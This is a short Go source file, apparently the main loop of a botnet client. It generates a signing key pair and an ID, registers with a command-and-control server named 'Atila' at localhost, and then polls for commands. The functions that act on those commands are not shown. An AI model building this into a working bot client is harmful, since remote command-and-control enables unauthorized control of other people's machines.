package main

import (
	"fmt"
	"time"

	"github.com/google/uuid"
)

// Key-pair used for signing and verifying messages.
var privateIdentificationKey = generatePrivateKey()
var publicIdentificationKey = &privateIdentificationKey.PublicKey

// Generate the unique bot identifier.
var id uuid.UUID = uuid.New()

// Atila is a back-end command & control server.
var atilaHost string = "http://localhost:60666"

func main() {
	// Make yourself known to the Atila. (cnc)
	for range time.Tick(time.Second * 5) {
		fmt.Println("Bot is trying to identify to the back-end.")
		identified := identify(id.String(), publicIdentificationKey)
		if identified {
			fmt.Println("Bot has been identified successfuly.")
			break
		}
	}

	for range time.Tick(time.Second * 10) {
		// Fetch and interpret messages, then issue responses.
		readerStatus := inboxReader(id.String())
		if readerStatus {
			fmt.Println("Successfully interpreted messages.")
		} else {
			fmt.Println("Failed to interpret messages.")
		}
	}
}
